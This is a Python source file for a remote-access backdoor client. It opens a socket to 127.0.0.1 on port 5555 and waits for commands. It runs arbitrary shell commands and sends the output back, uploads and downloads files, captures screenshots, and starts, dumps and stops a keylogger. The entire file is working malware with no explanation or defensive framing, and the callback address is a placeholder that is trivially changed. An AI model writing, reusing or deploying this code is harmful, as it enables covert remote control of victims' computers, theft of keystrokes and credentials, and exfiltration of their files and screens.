import socket
import json
import subprocess
import os
import pyautogui
import keylogger
import threading


def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def screenshot():
    f_screenshot = pyautogui.screenshot()
    f_screenshot.save('screen.png')


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger stopped!')
        else:
            if command == 'pwd':
                if os.name == 'nt':
                    command = 'cd'
            execute = subprocess.Popen(command,
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5555))
shell()
